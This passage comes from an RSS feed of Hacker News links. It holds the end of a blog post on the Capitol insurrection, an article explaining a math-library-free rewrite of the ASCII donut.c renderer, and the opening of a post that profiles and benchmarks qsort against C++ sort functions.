


<p>I don’t know what form the continuation of the trends that led to the Capitol Insurrection will take, if there will be further attempts at violent disruption in D.C. itself, or if we’ll see a shift to a campaign of domestic terror (something like <a href="https://en.wikipedia.org/wiki/The_Troubles">The Troubles</a>, in terms of the violence committed), or if, as with the Nazis after the failure of the <a href="https://en.wikipedia.org/wiki/Beer_Hall_Putsch">Beer Hall Putsch</a>, the folks who supported this insurrection will focus on trying to use the democratic process to abolish the democratic process.  <strong>But this is not over</strong>.  There is abundant polling evidence that among a minority of Americans (but a plurality or majority of Republicans; we’ll come back to that) support for the lies (that the election was fraudulent, <em><a href="https://factcheck.thedispatch.com/p/fact-check-debunking-donald-trumps">which it wasn’t</a></em>; the liars were <a href="https://beta.documentcloud.org/documents/20423518-trump_case_decision">given plenty of chances to provide any evidence at all</a> for their lies and they didn’t) remains high.  As in 545, a great many Americans still support Peisistratos.  Some smaller subset of them have bought into messianic conspiracy theories like Q-Anon which fairly transparently could lead to considerable violence. <strong> The underlying conditions that made the tyrannical attempt possible still exist</strong>, so we should expect …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787594</guid>
            <pubDate>Fri, 15 Jan 2021 06:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Donut.c Without a Math Library]]>
            </title>
            <description>
<![CDATA[
Score 131 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25787545">thread link</a>) | @robin_reala
<br/>
January 14, 2021 | https://www.a1k0n.net/2021/01/13/optimizing-donut.html | <a href="https://web.archive.org/web/*/https://www.a1k0n.net/2021/01/13/optimizing-donut.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    


    <div role="main">
      <div>
        

<article>
  <p>My little <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">donut.c</a> has
 been making the rounds
again, after being featured in a couple YouTube videos (e.g., <a href="https://www.youtube.com/watch?v=DEqXNfs_HhY">Lex
Fridman</a> and <a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Joma
Tech</a>).  If I had known how much
attention this code would get over the years, I would have spent more time on
it.</p>

<p>One thing that’s always been sort of unfortunate is the heavy use of <code>sin</code> and
<code>cos</code> – both because it necessitates linking the math library (<code>-lm</code>), but
also because it makes it much more CPU-intensive than it really needs to be.
This is especially apparent if you try to port it to an <a href="https://twitter.com/chainq/status/1297178062937825280">older
CPU</a> or an <a href="https://twitter.com/enjoy_digital/status/1341095343816118272">embedded
device</a>.</p>

<p>So, here’s a revised version with no use of <code>sin</code>, <code>cos</code>, and no need for
linking the math library (though this version still does use <code>float</code> types).</p>

<div><div><pre><code>             i,j,k,x,y,o,N;
         main(){float z[1760],a
      #define R(t,x,y) f=x;x-=t*y\
   ;y+=t*f;f=(3-x*x-y*y)/2;x*=f;y*=f;
   =0,e=1,c=1,d=0,f,g,h,G,H,A,t,D;char
 b[1760];for(;;){memset(b,32,1760);g=0,
h=1;memset(z,0,7040);for(j=0;j&lt;90;j++){
G=0,H=1;for(i=0;i&lt;314;i++){A=h+2,D=1/(G*
A*a+g*e+5);t=G*A        *e-g*a;x=40+30*D
*(H*A*d-t*c);y=          12+15*D*(H*A*c+
t*d);o=x+80*y;N          =8*((g*a-G*h*e)
*d-G*h*a-g*e-H*h        *c);if(22&gt;y&amp;&amp;y&gt;
 0&amp;&amp;x&gt;0&amp;&amp;80&gt;x&amp;&amp;D&gt;z[o]){z[o]=D;b[o]=(N&gt;0
  ?N:0)[".,-~:;=!*#$@"];}R(.02,H,G);}R(
  .07,h,g);}for(k=0;1761&gt;k;k++)putchar
   (k%80?b[k]:10);R(.04,e,a);R(.02,d,
     c);usleep(15000);printf('\n'+(
        " donut.c! \x1b[23A"));}}
          /*no math lib needed
             .@a1k0n 2021.*/
</code></pre></div></div>

<p>It’s a little misshapen and still has comments at the bottom. I used the first
frame of its output as a template and there’s <em>slightly</em> less code than filled
pixels – oh well. Output is pretty much the same as before:</p>


<pre id="d"></pre>



<p>So, how do we get sines and cosines without using <code>sin</code> and <code>cos</code>? Well, the
code doesn’t really <em>need</em> sine and cosine <em>per se</em>; what it actually does is
rotate a point around the origin in two nested loops, and also rotate two
angles just for the animation. If you’ll recall from the other article, the
inner loop is just plotting dots in a circle, which goes around another, larger
circle. In each loop, the sine/cosine terms are just moving by a small, fixed
angle.</p>

<p>So we don’t need to track the <em>angle</em> at all, we only need to start at cos=1,
sin=0 and rotate a circle around the origin to generate all the sines and
cosines we need. We just have to repeatedly apply a fixed rotation matrix:</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \begin{bmatrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>So for example, if we were to use an angle of .02 radians in our inner loop, it would look something like:</p>
<div><div><pre><code><span>float</span> <span>c</span><span>=</span><span>1</span><span>,</span> <span>s</span><span>=</span><span>0</span><span>;</span>  <span>// c for cos, s for sin</span>
<span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>314</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>  <span>// 314 * .02 ~= 2π</span>
  <span>// (use c, s in code)</span>
  <span>float</span> <span>newc</span> <span>=</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>c</span> <span>-</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>s</span><span>;</span>
  <span>s</span> <span>=</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>c</span> <span>+</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>s</span><span>;</span>
  <span>c</span> <span>=</span> <span>newc</span><span>;</span>
<span>}</span>
</code></pre></div></div>



<p>That works, but there’s a problem: no matter how precisely we define our
constants, after repeated iteration of this procedure, the magnitude of our \(\left(c, s\right)\) vector will exponentially grow or shrink over time. If we
only need to make one pass around the loop, maybe we can get away with that,
but if we have to make several (for the rotating animation, we do), we need to
fix that.</p>

<p><img src="https://www.a1k0n.net/img/sincos-mag.png" alt="sine and cosine magnitude creep"><br>
<em>an exaggerated illustration of what happens when repeatedly doing low-precision rotations</em></p>

<p>The simplest way to do that would be to multiply \(c\) and \(s\) by \(1/\sqrt{c^2 + s^2}\), but then we’re back to using the math library again. Instead, we can take
advantage of the fact that our magnitude starts out very close to 1, and we’re
going to be iterating this procedure: we can do a <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton
step</a> after each rotation, and
that will be enough to keep the magnitude “close enough” to 1 over time.</p>

<p>Our goal is to find the reciprocal square root (<a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">sound
familiar?</a>) of \(a =
c^2 + s^2\), our \(\left(c, s\right)\) vector magnitude.  Say we define a
function \(f(x) = \frac{1}{x^2} - a\). The function is 0 when \(x =
\frac{1}{\sqrt{a}}\). We can start with an initial guess of 1 for <em>x</em>,
perform a Newton iteration to obtain <em>x’</em>, which will be “closer to”
\(\frac{1}{\sqrt{a}}\), the correct value to scale <em>c</em> and <em>s</em> by so that their
magnitude \(c^2 + s^2\) is “close to” 1 again.</p>

<p>A Newton step is defined as \(x' = x - \frac{f(x)}{f'(x)}\). I used
<a href="https://www.sympy.org/">SymPy</a> to do the derivative and simplification and
came up with \(x' = \frac{x\left(3 - a x^2\right)}{2}\). Since we’re only doing
one step, we can plug in our initial guess of 1 for \(x\) and back-substitute
\(c^2 + s^2\) for \(a\) to finally get our adjustment: \(x' = (3 - c^2 - s^2)/2\).</p>



<p>But now that we don’t have to worry so much about the magnitude of our result
(within limits), we can take another shortcut (I got this idea studying old
<a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> algorithms).  If we divide out
the cosines from our original rotation matrix, we get</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \frac{1}{\cos \theta}\begin{bmatrix}
1 &amp; -\tan \theta \\
\tan \theta &amp; 1
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>using the trig identity \(\tan \theta = \frac{\sin \theta}{\cos \theta}\).
Since we’re only dealing with small angles, the leading \(\frac{1}{\cos
\theta}\) term is close enough to 1 that we can ignore it and have our Newton
step take care of it.</p>

<p>And now we can finally understand how the rotation is done in the code. Towards
the top of the donut code is this #define, which I’ve reindented:</p>

<div><div><pre><code><span>#define R(t,x,y) \ 
</span>  <span>f</span> <span>=</span> <span>x</span><span>;</span> \
  <span>x</span> <span>-=</span> <span>t</span><span>*</span><span>y</span><span>;</span> \
  <span>y</span> <span>+=</span> <span>t</span><span>*</span><span>f</span><span>;</span> \
  <span>f</span> <span>=</span> <span>(</span><span>3</span><span>-</span><span>x</span><span>*</span><span>x</span><span>-</span><span>y</span><span>*</span><span>y</span><span>)</span><span>/</span><span>2</span><span>;</span> \
  <span>x</span> <span>*=</span> <span>f</span><span>;</span> \
  <span>y</span> <span>*=</span> <span>f</span><span>;</span>
</code></pre></div></div>

<p>This does an in-place rotation of a unit vector <code>x, y</code> where <code>t</code> is \(\tan
\theta\). <code>f</code> is a temporary variable; the first three lines do the “matrix
multiplication” on <code>x, y</code>. <code>f</code> is then re-used to get the magnitude adjustment,
and then finally <code>x</code> and <code>y</code> are multiplied by <code>f</code> which moves them back onto
the unit circle.</p>

<p>With that operation in hand, I just replaced all the angles with their sines
and cosines and ran the rotation operator <code>R()</code> instead of calling <code>sin</code>/<code>cos</code>.
The code is otherwise identical.</p>



<p>We can use exactly the same ideas with integer fixed-point arithmetic, and not
use any <code>float</code> math whatsoever. I’ve redone all the math with 10-bit precision
and produced the following C code which runs well on embedded devices which can
do 32-bit multiplications and have ~4k of available RAM:</p>

<div><div><pre><code><span>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span>#define R(mul,shift,x,y) \
  _=x; \
  x -= mul*y&gt;&gt;shift; \
  y += mul*_&gt;&gt;shift; \
  _ = 3145728-x*x-y*y&gt;&gt;11; \
  x = x*_&gt;&gt;10; \
  y = y*_&gt;&gt;10;
</span>
<span>int8_t</span> <span>b</span><span>[</span><span>1760</span><span>],</span> <span>z</span><span>[</span><span>1760</span><span>];</span>

<span>void</span> <span>main</span><span>()</span> <span>{</span>
  <span>int</span> <span>sA</span><span>=</span><span>1024</span><span>,</span><span>cA</span><span>=</span><span>0</span><span>,</span><span>sB</span><span>=</span><span>1024</span><span>,</span><span>cB</span><span>=</span><span>0</span><span>,</span><span>_</span><span>;</span>
  <span>for</span> <span>(;;)</span> <span>{</span>
    <span>memset</span><span>(</span><span>b</span><span>,</span> <span>32</span><span>,</span> <span>1760</span><span>);</span>  <span>// text buffer</span>
    <span>memset</span><span>(</span><span>z</span><span>,</span> <span>127</span><span>,</span> <span>1760</span><span>);</span>   <span>// z buffer</span>
    <span>int</span> <span>sj</span><span>=</span><span>0</span><span>,</span> <span>cj</span><span>=</span><span>1024</span><span>;</span>
    <span>for</span> <span>(</span><span>int</span> <span>j</span> <span>=</span> <span>0</span><span>;</span> <span>j</span> <span>&lt;</span> <span>90</span><span>;</span> <span>j</span><span>++</span><span>)</span> <span>{</span>
      <span>int</span> <span>si</span> <span>=</span> <span>0</span><span>,</span> <span>ci</span> <span>=</span> <span>1024</span><span>;</span>  <span>// sine and cosine of angle i</span>
      <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>324</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
        <span>int</span> <span>R1</span> <span>=</span> <span>1</span><span>,</span> <span>R2</span> <span>=</span> <span>2048</span><span>,</span> <span>K2</span> <span>=</span> <span>5120</span><span>*</span><span>1024</span><span>;</span>

        <span>int</span> <span>x0</span> <span>=</span> <span>R1</span><span>*</span><span>cj</span> <span>+</span> <span>R2</span><span>,</span>
            <span>x1</span> <span>=</span> <span>ci</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x2</span> <span>=</span> <span>cA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x3</span> <span>=</span> <span>si</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x4</span> <span>=</span> <span>R1</span><span>*</span><span>x2</span> <span>-</span> <span>(</span><span>sA</span><span>*</span><span>x3</span> <span>&gt;&gt;</span> <span>10</span><span>),</span>
            <span>x5</span> <span>=</span> <span>sA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x6</span> <span>=</span> <span>K2</span> <span>+</span> <span>R1</span><span>*</span><span>1024</span><span>*</span><span>x5</span> <span>+</span> <span>cA</span><span>*</span><span>x3</span><span>,</span>
            <span>x7</span> <span>=</span> <span>cj</span><span>*</span><span>si</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x</span> <span>=</span> <span>40</span> <span>+</span> <span>30</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x1</span> <span>-</span> <span>sB</span><span>*</span><span>x4</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>y</span> <span>=</span> <span>12</span> <span>+</span> <span>15</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x4</span> <span>+</span> <span>sB</span><span>*</span><span>x1</span><span>)</span><span>/</span><span>x6</span><span>,</span>
            <span>N</span> <span>=</span> <span>(</span><span>-</span><span>cA</span><span>*</span><span>x7</span> <span>-</span> <span>cB</span><span>*</span><span>((</span><span>-</span><span>sA</span><span>*</span><span>x7</span><span>&gt;&gt;</span><span>10</span><span>)</span> <span>+</span> <span>x2</span><span>)</span> <span>-</span> <span>ci</span><span>*</span><span>(</span><span>cj</span><span>*</span><span>sB</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>&gt;&gt;</span> <span>10</span><span>)</span> <span>-</span> <span>x5</span> <span>&gt;&gt;</span> <span>7</span><span>;</span>

        <span>int</span> <span>o</span> <span>=</span> <span>x</span> <span>+</span> <span>80</span> <span>*</span> <span>y</span><span>;</span>
        <span>int8_t</span> <span>zz</span> <span>=</span> <span>(</span><span>x6</span><span>-</span><span>K2</span><span>)</span><span>&gt;&gt;</span><span>15</span><span>;</span>
        <span>if</span> <span>(</span><span>22</span> <span>&gt;</span> <span>y</span> <span>&amp;&amp;</span> <span>y</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>x</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>80</span> <span>&gt;</span> <span>x</span> <span>&amp;&amp;</span> <span>zz</span> <span>&lt;</span> <span>z</span><span>[</span><span>o</span><span>])</span> <span>{</span>
          <span>z</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>zz</span><span>;</span>
          <span>b</span><span>[</span><span>o</span><span>]</span> <span>=</span> <span>".,-~:;=!*#$@"</span><span>[</span><span>N</span> <span>&gt;</span> <span>0</span> <span>?</span> <span>N</span> <span>:</span> <span>0</span><span>];</span>
        <span>}</span>
        <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>ci</span><span>,</span> <span>si</span><span>)</span>  <span>// rotate i</span>
      <span>}</span>
      <span>R</span><span>(</span><span>9</span><span>,</span> <span>7</span><span>,</span> <span>cj</span><span>,</span> <span>sj</span><span>)</span>  <span>// rotate j</span>
    <span>}</span>
    <span>for</span> <span>(</span><span>int</span> <span>k</span> <span>=</span> <span>0</span><span>;</span> <span>1761</span> <span>&gt;</span> <span>k</span><span>;</span> <span>k</span><span>++</span><span>)</span>
      <span>putchar</span><span>(</span><span>k</span> <span>%</span> <span>80</span> <span>?</span> <span>b</span><span>[</span><span>k</span><span>]</span> <span>:</span> <span>10</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>7</span><span>,</span> <span>cA</span><span>,</span> <span>sA</span><span>);</span>
    <span>R</span><span>(</span><span>5</span><span>,</span> <span>8</span><span>,</span> <span>cB</span><span>,</span> <span>sB</span><span>);</span>
    <span>usleep</span><span>(</span><span>15000</span><span>);</span>
    <span>printf</span><span>(</span><span>"</span><span>\x1b</span><span>[23A"</span><span>);</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The output is pretty much the same.</p>

</article>







      </div>
    </div>
  </div></div>]]>
            </description>
            <link>https://www.a1k0n.net/2021/01/13/optimizing-donut.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787545</guid>
            <pubDate>Fri, 15 Jan 2021 06:01:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beating Up on Qsort (2019)]]>
            </title>
            <description>
<![CDATA[
Score 80 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25783617">thread link</a>) | @tjalfi
<br/>
January 14, 2021 | https://travisdowns.github.io/blog/2019/05/22/sorting.html | <a href="https://web.archive.org/web/*/https://travisdowns.github.io/blog/2019/05/22/sorting.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Recently, Daniel Lemire <a href="https://lemire.me/blog/2019/05/07/almost-picking-n-distinct-numbers-at-random/">tackled the topic</a> of selecting N <em>distinct</em> numbers at random. In the case we want sorted output, an obvious solution presents itself: sorting randomly chosen values and de-duplicating the list, which is easy since identical values are now adjacent.<sup id="fnref:distinct" role="doc-noteref"><a href="#fn:distinct">1</a></sup></p>

<p>While Daniel suggests a clever method of avoiding a sort entirely<sup id="fnref:danmethod" role="doc-noteref"><a href="#fn:danmethod">2</a></sup>, I’m also interested in they <em>why</em> for the underlying performace of the sort method: it takes more than 100 ns per element, which means 100s of CPU clock cycles and usually even more instructions than that (on a superscalar processor)! As a sanity check, a quick benchmark (<code>perf record ./bench &amp;&amp; perf report</code>) shows that more than 90% of the time spent in this approach is in the sorting routine, <a href="https://devdocs.io/c/algorithm/qsort">qsort</a> - so we are right to focus on this step, rather than say the de-duplication step or the initial random number generation. This naturally, this raises the question: how fast is qsort when it comes to sorting integers and can we do better?</p>

<p>All of the code for this post <a href="https://github.com/travisdowns/sort-bench">is available on GitHub</a>, so if you’d like to follow along with the code open in an editor, go right ahead (warning: there are obviously some spoilers if you dig through the code first).</p>

<h2 id="benchmarking-qsort">Benchmarking Qsort</h2>

<p>First, let’s take a look at what <code>qsort</code> is doing, to see if there is any delicous low-hanging performance fruit. We use <code>perf record ./bench qsort</code> to capture profiling data, and <code>perf report --stdio</code> to print a summary<sup id="fnref:long-tail" role="doc-noteref"><a href="#fn:long-tail">3</a></sup>:</p>

<div><div><pre><code># Samples: 101K of event 'cycles:ppp'
# Event count (approx.): 65312285835
#
# Overhead  Command  Shared Object      Symbol
# ........  .......  .................  ..............................................
#
    64.90%  bench    libc-2.23.so       [.] msort_with_tmp.part.0
    21.45%  bench    bench              [.] compare_uint64_t
     8.65%  bench    libc-2.23.so       [.] __memcpy_sse2
     0.87%  bench    libc-2.23.so       [.] __memcpy_avx_unaligned
     0.83%  bench    bench              [.] main
     0.41%  bench    [kernel.kallsyms]  [k] clear_page_erms
     0.34%  bench    [kernel.kallsyms]  [k] native_irq_return_iret
     0.31%  bench    bench              [.] bench_one
</code></pre></div></div>

<p>The assembly for the biggest offender, <code>msort_with_tmp</code> looks like this<sup id="fnref:annotate-command" role="doc-noteref"><a href="#fn:annotate-command">4</a></sup> :</p>

<div><div><pre><code> Percent | Address      | Disassembly
--------------------------------------------------
   30.55 :   39200:       mov    rax,QWORD PTR [r15]
    0.61 :   39203:       sub    rbp,0x1
    0.52 :   39207:       add    r15,0x8
    7.30 :   3920b:       mov    QWORD PTR [rbx],rax
    0.39 :   3920e:       add    rbx,0x8
    0.07 :   39212:       test   r12,r12
    0.09 :   39215:       je     390e0   ; merge finished
    1.11 :   3921b:       test   rbp,rbp
    0.01 :   3921e:       je     390e0   ; merge finished
    5.24 :   39224:       mov    rdx,QWORD PTR [rsp+0x8]
    0.42 :   39229:       mov    rsi,r15
    0.19 :   3922c:       mov    rdi,r13
    6.08 :   3922f:       call   r14
    0.59 :   39232:       test   eax,eax
    3.52 :   39234:       jg     39200
   32.69 :   39236:       mov    rax,QWORD PTR [r13+0x0]
    1.31 :   3923a:       sub    r12,0x1
    1.01 :   3923e:       add    r13,0x8
    1.09 :   39242:       jmp    3920b &lt;bsearch@@GLIBC_2.2.5+0x205b&gt;
</code></pre></div></div>

<p>Depending on your level of assembly reading skill, it may not be obvious, but this is basically a classic merge routine: it is merging two lists by comparing the top elements of each list (pointed to by <code>r13</code> and <code>r15</code>), and then storing the smaller element (the line <code>QWORD PTR [rbx],rax</code>) and loading the next element from that list. There are also two checks for termination (<code>test   r12,r12</code> and <code>test   rbp,rbp</code>). This hot loop corresponds directly to this code from <code>glibc</code> (from the file<code>msort.c</code><sup id="fnref:msort-note" role="doc-noteref"><a href="#fn:msort-note">5</a></sup>) :</p>

<div><div><pre><code><span>while</span> <span>(</span><span>n1</span> <span>&gt;</span> <span>0</span> <span>&amp;&amp;</span> <span>n2</span> <span>&gt;</span> <span>0</span><span>)</span>
<span>{</span>
    <span>if</span> <span>((</span><span>*</span><span>cmp</span><span>)</span> <span>(</span><span>b1</span><span>,</span> <span>b2</span><span>,</span> <span>arg</span><span>)</span> <span>&lt;=</span> <span>0</span><span>)</span>
    <span>{</span>
        <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>tmp</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>b1</span><span>;</span>
        <span>b1</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n1</span><span>;</span>
    <span>}</span>
    <span>else</span>
    <span>{</span>
        <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>tmp</span> <span>=</span> <span>*</span><span>(</span><span>uint64_t</span> <span>*</span><span>)</span> <span>b2</span><span>;</span>
        <span>b2</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
        <span>--</span><span>n2</span><span>;</span>
    <span>}</span>
    <span>tmp</span> <span>+=</span> <span>sizeof</span> <span>(</span><span>uint64_t</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This loop suffers heavily from branch mispredictions, since the “which element is larger” branch is highly unpredictable (at least for random-looking input data). Indeed, we see roughly 128 million mispredicts while sorting ~11 million elements: close to 12 mispredicts per element.</p>

<p>We also note the presence of the indirect call at the <code>call r14</code> line. This corresponds to the <code>(*cmp) (b1, b2, arg)</code> expression in the source: it is calling the user provided comparator function through a function pointer. Since the <code>qsort()</code> code is compiled ahead of time and is found inside the shared libc binary, there is no chance that the comparator, passed as a function pointer, can be inlined.</p>

<p>The comparator function I provide looks like:</p>

<div><div><pre><code><span>int</span> <span>compare_uint64_t</span><span>(</span><span>const</span> <span>void</span> <span>*</span><span>l_</span><span>,</span> <span>const</span> <span>void</span> <span>*</span><span>r_</span><span>)</span> <span>{</span>
    <span>uint64_t</span> <span>l</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>l_</span><span>;</span>
    <span>uint64_t</span> <span>r</span> <span>=</span> <span>*</span><span>(</span><span>const</span> <span>uint64_t</span> <span>*</span><span>)</span><span>r_</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&lt;</span> <span>r</span><span>)</span> <span>return</span> <span>-</span><span>1</span><span>;</span>
    <span>if</span> <span>(</span><span>l</span> <span>&gt;</span> <span>r</span><span>)</span> <span>return</span>  <span>1</span><span>;</span>
    <span>return</span> <span>0</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>which on gcc compiles to branch-free code:</p>

<div><div><pre><code>mov    rax,QWORD PTR [rsi]
mov    edx,0xffffffff
cmp    QWORD PTR [rdi],rax
seta   al
movzx  eax,al
cmovb  eax,edx
ret
</code></pre></div></div>

<p>Note that the comparator has to redundantly load from memory the two locations to compare, something the merge loop already did (the merge loop reads them because it is responsible for moving the elements).</p>

<p>How much better could things get if we inline the comparator into the merge loop? That’s what we do in <code>qsort-inlined</code><sup id="fnref:inline-hard" role="doc-noteref"><a href="#fn:inline-hard">6</a></sup>, and here’s the main loop which now includes the comparator function<sup id="fnref:cmdline1" role="doc-noteref"><a href="#fn:cmdline1">7</a></sup> :</p>

<pre><code> 0.07 :   401dc8:       test   rbp,rbp
 0.66 :   401dcb:       je     401e0c &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0xbc&gt;
 3.51 :   401dcd:       mov    rax,QWORD PTR [r9]
 5.00 :   401dd0:       lea    rdx,[rbx+0x8]
 1.62 :   401dd4:       mov    rcx,QWORD PTR [rbx]
 0.24 :   401dd7:       lea    r8,[r9+0x8]
 6.96 :   401ddb:       cmp    rax,rcx
20.83 :   401dde:       cmovbe r9,r8
 8.88 :   401de2:       cmova  rbx,rdx
 0.27 :   401de6:       cmp    rcx,rax
 6.23 :   401de9:       sbb    r8,r8
 0.74 :   401dec:       cmp    rcx,rax
 4.93 :   401def:       sbb    rdx,rdx
 0.24 :   401df2:       not    r8
 6.69 :   401df5:       add    rbp,rdx
 0.44 :   401df8:       cmp    rax,rcx
 5.34 :   401dfb:       cmova  rax,rcx
 5.96 :   401dff:       add    rdi,0x8
 7.48 :   401e03:       mov    QWORD PTR [rdi-0x8],rax
 0.00 :   401e07:       add    r15,r8
 0.71 :   401e0a:       jne    401dc8 &lt;void msort_with_tmp&lt;CompareU64&gt;(msort_param const*, void*, unsigned long, CompareU64)+0x78&gt;
</code></pre>

<p>A key difference is that the core of the loop is now branch free. Yes, there are still two conditional jumps, but they are both just checking for the termination condition (that one of the lists to merge is exhausted), so we expect this loop to be free of branch mispredictions other than the final iteration. Indeed, we measure with <code>perf stat</code> that the misprediction rate has dropped from to close to 12 mispredicts per element to around 0.75 per element. The loop has only two loads and one store, so the memory access redundancy between the merge code and the comparator has been eliminated<sup id="fnref:load-redundancy" role="doc-noteref"><a href="#fn:load-redundancy">8</a></sup>. Finally, the comparator does a three-way compare (returning distrinct results for <code>&lt;</code>, <code>&gt;</code> and <code>==</code>), but the merge code only needs a two-way compare (<code>&lt;=</code> or <code>&gt;</code>) - inlining the comparator manages to remove extra code associated with distinguishing the <code>&lt;</code> and <code>==</code> cases.</p>

<p>What’s the payoff? It’s pretty big:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig2.svg" alt="Effect of comparator inlining"></p>

<p>The speedup hovers right around 1.77x. Note that this is much larger than simply eliminating all the time spent in the separate comparator function in the original version (about 17% of the time implying a speedup of 1.2x if all the function time disapeared). This is a good example of how inlining isn’t just about removing function call overhead but enabling further <em>knock on</em> optimizations which can have a much larger effect than just removing the overhead associated with function calls.</p>

<h2 id="what-about-c">What about C++?</h2>

<p>Short of copying the existing glibc (note: LGPL licenced) sorting code to allow inlining, what else can we do to speed things up? I’m writing in C++, so how about the C++ sort functions available in the <code>&lt;algorithm&gt;</code> header? Unlike C’s <code>qsort</code> which is generic by virtue of taking a function pointer and information about the object size, the C++ sort functions use templates to achieve genericity and so are implemented directly in header files. Since the sort code and the comparator are being compiler together, we expect the comparator to be easily inlined, and perhaps other optimizations may occur.</p>

<p>Without further ado, let’s just throw <code>std::sort</code>, <code>std::stable_sort</code> and <code>std::partial_sort</code> into the mix:</p>

<p><img src="https://travisdowns.github.io/assets/2019-05-22/fig3.svg" alt="C vs C++ sort functions"></p>

<p>The C++ sort functions, other than perhaps <code>std::partial_sort</code><sup id="fnref:partial-sort" role="doc-noteref"><a href="#fn:partial-sort">9</a></sup>, put in a good showing. It is interesting that <code>std::stable_sort</code> which has <em>stricly more requirements</em> on its implementation than <code>std::sort</code> (i.e., any stable sort is also suitable for <code>std::sort</code>) ends up faster. I re-wrote this paragaph several times, since sometimes after a reboot <code>stable_sort</code> was slower and sometimes it was faster (as shown above). When it was “fast” it had less than 2% branch mispredictions, and when it was slow it was at 15%. So perhaps there was some type of aliasing issue in the branch predictor which depends on the physical addresses assigned, which can vary from run to run, I’m not sure. See <sup id="fnref:stablesort" role="doc-noteref"><a href="#fn:stablesort">10</a></sup> for an old note from when <code>std::stable_sort</code> was slower.</p>

<h2 id="can-we-do-better">Can we do better?</h2>

<p>So that’s as fast as it gets, right? We aren’t going to beat <code>std::sort</code> or <code>std::stable_sort</code> without a huge amount of effort, I think? After all, these are presumably highly optimized sorting routines written by the standard library implementors. Sure, we might expect to be able to beat <code>qsort()</code>, but that’s mostly because of built-in disadvantages that <code>qsort</code> has, lacking the ability to inline the comparator, etc.</p>

<h3 id="radix-sort-attempt-1">Radix Sort Attempt 1</h3>

<p>Well, one thing we can try is a non-comparison sort. We know we have integer keys, so why stick to comparing …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://travisdowns.github.io/blog/2019/05/22/sorting.html">https://travisdowns.github.io/blog/2019/05/22/sorting.html</a></em></p>]]>
            </description>
            <link>https://travisdowns.github.io/blog/2019/05/22/sorting.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25783617</guid>
            <pubDate>Thu, 14 Jan 2021 22:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
